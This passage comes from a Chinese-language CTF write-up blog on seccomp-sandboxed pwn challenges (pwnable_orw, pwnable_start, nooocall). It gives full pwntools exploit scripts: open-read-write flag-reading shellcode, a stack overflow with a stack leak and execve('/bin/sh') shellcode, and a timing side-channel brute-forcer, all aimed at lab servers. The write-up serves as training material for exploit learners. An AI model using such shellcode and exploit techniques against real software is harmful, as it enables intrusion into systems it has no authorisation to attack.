class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./2.23/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">offest = <span class="number">0x41414000</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">'./flag'</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, offest, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, offest, <span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2021/10/17/seccomp-orw/6.png"></p>
+<h3 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable_orw"></a>pwnable_orw</h3><blockquote>
+<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_orw">https://buuoj.cn/challenges#pwnable_orw</a></p>
+</blockquote>
+<p><img src="/2021/10/17/seccomp-orw/7.png"></p>
+<p>进IDA看一下吧。</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>还是直接输入shellcode，只可以用orw，exit等函数。这题我们的shellcode自己写也可以使用shellcraft，需要对系统调用的参数传递比较熟悉，eax为系统调用号，ebx，ecx，edx依次为传递的参数。我们要读的flag文件为./flag，flag字符串为0x67616c66</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">open</span> = </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx; # edx  = int mode 设定权限的</span></span><br><span class="line"><span class="string">push ecx; #字符串结束符\x00</span></span><br><span class="line"><span class="string">push 0x67616c66; #flag字符串</span></span><br><span class="line"><span class="string">mov ebx,esp;  #ebx = const char __user *filename</span></span><br><span class="line"><span class="string">mov eax,0x5;  # eax = sys_open , 系统调用号</span></span><br><span class="line"><span class="string">int 0x80;  # syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">read = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,0x3;  # eax = sys_read ，系统调用号为3</span></span><br><span class="line"><span class="string">mov ecx,ebx;  # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”</span></span><br><span class="line"><span class="string">mov ebx,0x3;  # ebx = unsigned int fd = 3 ,文件描述符</span></span><br><span class="line"><span class="string">mov edx,0x100; # edx = size_t count 对应字节数</span></span><br><span class="line"><span class="string">int 0x80;  #syscall</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">write = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,0x4; # eax = sys_write ，系统调用号为4</span></span><br><span class="line"><span class="string">mov ebx,0x1; # ebx = unsigned int fd = 1,文件描述符</span></span><br><span class="line"><span class="string">int 0x80; #syscall</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">28090</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">orw_open = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx; </span></span><br><span class="line"><span class="string">push ecx;</span></span><br><span class="line"><span class="string">push 0x67616c66;</span></span><br><span class="line"><span class="string">mov ebx,esp;  </span></span><br><span class="line"><span class="string">mov eax,0x5;  </span></span><br><span class="line"><span class="string">int 0x80; </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">orw_read = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,0x3;  </span></span><br><span class="line"><span class="string">mov ecx,ebx;  </span></span><br><span class="line"><span class="string">mov ebx,0x3; </span></span><br><span class="line"><span class="string">mov edx,0x100; </span></span><br><span class="line"><span class="string">int 0x80;  </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">orw_write = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,0x4; </span></span><br><span class="line"><span class="string">mov ebx,0x1; </span></span><br><span class="line"><span class="string">int 0x80; </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(orw_open + orw_read + orw_write)</span><br><span class="line"></span><br><span class="line">r.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'shellcode.len = '</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode))))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2021/10/17/seccomp-orw/9.png"></p>
+<h3 id="pwnable-start"><a href="#pwnable-start" class="headerlink" title="pwnable_start"></a>pwnable_start</h3><blockquote>
+<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_start">https://buuoj.cn/challenges#pwnable_start</a></p>
+</blockquote>
+<p><img src="/2021/10/17/seccomp-orw/10.png"></p>
+<p>什么也看不出来。看一下汇编吧。</p>
+<p><img src="/2021/10/17/seccomp-orw/11.png"></p>
+<p>eax是32位系统调用，ebx，ecx，edx分别是第一，二，三参数。其中dl bl是edx，ebx的低位。从上面的汇编可以看出首先将eax，ebx，ecx，edx清0。接着压入一些数据这些数据其实是<code>Let's start the CTF:</code>接着将这些数据给了ecx二参数的寄存器。dl为0x14，bl为1，接着al为4，也就是write(1, buf，0x14)。接下来将ebx清0。dl=0x3c，al=3，也就是read(0，buf，0x3c)。</p>
+<p>将shellcode写入可执行区域，然后让eip指向shellcode就可以了。因为有read，所以直接读到栈上就可以了，保护全关，要先泄露一下栈地址。因为esp，14h，所以需要先填0x14个字节，再填一个字节指向mov ecx,esp就可以了。mov ecx, esp把esp指向的值write出来。栈地址出来了，rop链就可以了。注意的地方是shellcraft.sh太大了。可写区域只有36字节，所以我们得自己写一个shellcode</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">mov al, 0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27426</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">0x14</span> + p32(<span class="number">0x8048087</span>)</span><br><span class="line">r.sendafter(<span class="string">"Let's start the CTF:"</span>,p1)</span><br><span class="line"><span class="comment">#shellcode = "\x31\xc9\x31\xd2\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">stack_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">'stack_addr = '</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx, ecx;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">push edx;</span></span><br><span class="line"><span class="string">push 0x68732f6e;</span></span><br><span class="line"><span class="string">push 0x69622f2f;</span></span><br><span class="line"><span class="string">mov ebx, esp;</span></span><br><span class="line"><span class="string">mov al, 0xb;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b'a'</span> * <span class="number">0x14</span> + p32(stack_addr + <span class="number">20</span>) + shellcode</span><br><span class="line">r.sendline(p2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2021/10/17/seccomp-orw/12.png"></p>
+<h3 id="noocall"><a href="#noocall" class="headerlink" title="noocall"></a>noocall</h3><blockquote>
+<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#xman_2019_nooocall">https://buuoj.cn/challenges#xman_2019_nooocall</a></p>
+</blockquote>
+<p><img src="/2021/10/17/seccomp-orw/14.png"></p>
+<p>进IDA里面分析一下吧。</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">{</span><br><span class="line">  FILE *v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  sub_B91(a1, a2, a3);</span><br><span class="line">  v4 = fopen(<span class="string">"./flag.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  v5 = mmap((<span class="type">void</span> *)<span class="number">0x200000000</span>LL, <span class="number">0x2000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x300000000</span>LL, <span class="number">0x20000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  _isoc99_fscanf(v4, <span class="string">"%s"</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your Shellcode &gt;&gt;"</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  sub_C34();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>fopen了flag，flag已经被放到了内存里。跟进sub_c34()看一下。</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_C34</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>开了沙箱。使用寄存器比较flag.txt，并输入字节大小的数据。如果相同则用jz来重复shell代码。需要进行爆破。</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    mov rax,[rsp+0x10]	#rsp+0x10处存储的是缓冲区上IO结构体的地址，放进rax</span></span><br><span class="line"><span class="string">    mov rax,[rax+0x18]	#rax+0x18处存储的是flag的地址</span></span><br><span class="line"><span class="string">    mov al,byte ptr[rax+%d]	#我们通过rax+%d每次取flag的一个字符进行爆破</span></span><br><span class="line"><span class="string">    cmp al,%d			#被我们取出的字符放入al，%d此时是guess_char的ascii码，cmp把我们取出的flag对应位置的字符和p_char中的每个进行对比，然后对ZF位置位</span></span><br><span class="line"><span class="string">    jz $-0x2			#如果ZF=1，即al-%d==0，那么说明爆破成功，这样我们再jz跳转到$-2也就是造成一个无限循环，这样使得延时必然大于3秒。</span></span><br><span class="line"><span class="string">    '''</span> % (index,<span class="built_in">ord</span>(guess_char))</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level = <span class="string">'critical'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    flag.append(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">'a'</span>), <span class="built_in">ord</span>(<span class="string">'z'</span>) + <span class="number">1</span>):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">flag.append(<span class="string">'{'</span>)</span><br><span class="line">flag.append(<span class="string">'-'</span>)</span><br><span class="line">flag.append(<span class="string">'}'</span>)</span><br><span class="line">flag.append(<span class="string">'\x00'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'[+] flag = '</span> + <span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">final = <span class="string">''</span></span><br><span class="line">xman = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> xman:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'[+] '</span> + <span class="built_in">str</span>(index) + <span class="string">' chr'</span>)</span><br><span class="line">    <span class="keyword">for</span> test_flag <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26020</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = process(file_name)</span><br><span class="line">        shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        mov rax,[rsp + 0x10]</span></span><br><span class="line"><span class="string">        mov rax,[rax + 0x18]</span></span><br><span class="line"><span class="string">        mov al,byte ptr[rax + %d]</span></span><br><span class="line"><span class="string">        cmp al,%d</span></span><br><span class="line"><span class="string">        jz $-0x2</span></span><br><span class="line"><span class="string">        '''</span> % (index, <span class="built_in">ord</span>(test_flag)))</span><br><span class="line">        r.sendlineafter(<span class="string">'Your Shellcode &gt;&gt;'</span>, shellcode)</span><br><span class="line">        start = time.time()</span><br><span class="line">        r.can_recv_raw(timeout = <span class="number">3</span>)</span><br><span class="line">        end = time.time()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> test_flag == <span class="string">'\x00'</span>:</span><br><span class="line">                xman = <span class="literal">True</span></span><br><span class="line">            final += test_flag</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'[+] success get '</span> + <span class="built_in">str</span>(index) + <span class="string">' chr'</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'[+] final = '</span> + final)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2021/10/17/seccomp-orw/15.png"></p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp"><span class="toc-number">1.</span> <span class="toc-text">seccomp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89seccomp"><span class="toc-number">1.1.</span> <span class="toc-text">没有seccomp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%BA%86seccomp"><span class="toc-number">1.2.</span> <span class="toc-text">加了seccomp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ORW"><span class="toc-number">2.</span> <span class="toc-text">ORW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-asm"><span class="toc-number">3.1.</span> <span class="toc-text">pwnable_asm</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-orw"><span class="toc-number">3.2.</span> <span class="toc-text">pwnable_orw</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnable-start"><span class="toc-number">3.3.</span> <span class="toc-text">pwnable_start</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#noocall"><span class="toc-number">3.4.</span> <span class="toc-text">noocall</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/10/17/seccomp-orw/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/10/17/seccomp-orw/&amp;text=seccomp_orw"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/10/17/seccomp-orw/&amp;is_video=false&amp;description=seccomp_orw"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=seccomp_orw&amp;body=Check out this article: http://example.com/2021/10/17/seccomp-orw/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/10/17/seccomp-orw/&amp;title=seccomp_orw"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/10/17/seccomp-orw/&amp;name=seccomp_orw&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/10/17/seccomp-orw/&amp;t=seccomp_orw"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright ©
+    
+    
+    2021-2023
+    z1r0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
